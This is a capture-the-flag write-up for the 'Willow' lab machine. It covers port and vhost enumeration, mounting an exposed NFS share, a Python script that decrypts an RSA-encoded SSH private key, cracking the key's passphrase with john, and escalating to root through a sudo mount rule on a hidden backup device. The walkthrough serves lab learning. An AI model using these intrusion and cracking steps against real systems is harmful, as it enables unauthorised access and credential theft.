# Willow - Medium

* Add ```willow.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v willow.thm```

* Open ports & services:

  * 22/tcp - ssh - OpenSSH 6.7p1 Debian 5 (protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.10 ((Debian))
  * 111/tcp - rpcbind 2-4 (RPC #100000)
  * 2049/tcp - nfs_acl 2-3 (RPC #100227)

* Starting with enumeration on port 80:

  ```sh
  gobuster dir -u http://willow.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  # this does not give anything

  ffuf -c -u "http://willow.thm" -H "Host: FUZZ.willow.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 20474 -s
  # subdomain enum

  gobuster vhost -u http://willow.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enum
  # no subdomains or vhosts found
  ```

* The webpage itself, titled "Recovery Page", contains a huge chunk of numbers; not sure what it could be used for.

* Using CyberChef, when decoded from Hex with no delimiter, we get a message - "Hey Willow, here's your SSH Private key -- you know where the decryption key is!", followed by another big message with chunks of numbers - the numbers are in 4 or 5 digit groups.

* The above information gives us the username 'Willow', but we would have to search further for the decryption key

* Enumerating NFS:

  ```sh
  showmount -e willow.thm
  # shows /var/failsafe is available to be mounted

  mkdir target-share

  sudo mount -t nfs willow.thm:/ ./target-share/ -o nolock
  # mount the share

  cd target-share

  tree .
  # we have rsa_keys file

  cd var/failsafe

  sudo cp rsa_keys ~/rsa_keys

  cd

  # unmount the share
  sudo umount ./target-share

  # inspect the keys file
  cat rsa_keys
  ```

* The 'rsa_keys' file contains the following text:

  ```text
  Public Key Pair: (23, 37627)
  Private Key Pair: (61527, 37627)
  ```

* While these do look like variables to be used when generating a SSH key, [this blog on RSA encryption](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/) given in the hint goes into more detail

* According to the above blog, we have the following info so far:

  * Encryption key (public exponent), e = 23
  * Decryption key (private exponent), d = 61527
  * Modulus, n = 37627

* Following the methodology given in the blog, we can reverse-engineer the script and create our own short script:

  ```py
  # variables known to us
  e = 23
  d = 61527
  n = 37627
  message = ""

  # store ciphertext in file 'to_decrypt.txt' in same directory
  # opening in read mode
  file = open('to_decrypt.txt', 'r')

  # following the logic highlighted in blog
  # to decrypt ciphertext with public exponent, private exponent and modulus

  for line in file:
      listNumbers = [int(i) for i in line.split()]
      for number in listNumbers:
          decr = (number ** d) % n
          message += chr(decr)
      print(message)
  ```

* On running the script, with the ciphertext kept in a file in the same directory, it runs for a while to print the decrypted RSA key - we can store this in a file and try to login:

  ```sh
  vim willow_rsa
  # copy and paste the decrypted output

  chmod 600 willow_rsa

  ssh willow@willow.thm -i willow_rsa
  # this requires a passphrase

  ssh2john willow_rsa > hash_willow

  john --wordlist=/usr/share/wordlists/rockyou.txt hash_willow
  # this gives us the passphrase 'wildflower'

  ssh willow@willow.thm -i willow_rsa
  # the passphrase works
  # but we get another error
  # "sign_and_send_pubkey: no mutual signature supported"

  # we need to add SSH-RSA as an accepted type

  ssh willow@willow.thm -i willow_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa
  # this works with passphrase
  ```

* We get access as 'willow'; the user flag is an image, so we need to transfer this to our machine:

  ```sh
  # in attacker machine
  scp -i willow_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa willow@willow.thm:/home/willow/user.jpg .
  # this image shows user flag

  # back in willow ssh
  ls -la /home
  # we only have 'willow' user

  ls -la
  # we can continue enumeration

  sudo -l
  # shows we can run this as sudo
  # (ALL : ALL) NOPASSWD: /bin/mount /dev/*

  # check for anything in /mnt directory
  ls -la /mnt

  ls -la /mnt/creds
  # this is empty

  lsblk
  # /bin/lsblk: Permission denied
  # we have to find another way
  
  # check /dev
  ls -la /dev

  # this contains a 'hidden_backup' file
  # but we cannot read this

  # we can use the mount privileges from 'sudo -l'

  mkdir /tmp/target-mount

  sudo /bin/mount /dev/hidden_backup /tmp/target-mount

  cd /tmp/target-mount

  ls -la
  # we have a file here

  cat creds.txt
  ```

* This contains the creds for both root and 'willow' user - we can switch users now:

  ```sh
  su root
  # switch to root user

  ls -la /root

  cat /root/root.txt
  # this does not give us the root flag
  # it says the flag was given some time ago

  grep -r / "THM" 2>/dev/null
  # this does not give anything

  lsblk
  # nothing here as well

  # the only thing we have is the image file
  # we can check that

  # in attacker machine
  steghide extract -sf user.jpg
  # this works with root password from earlier
  # extracts root flag
  ```
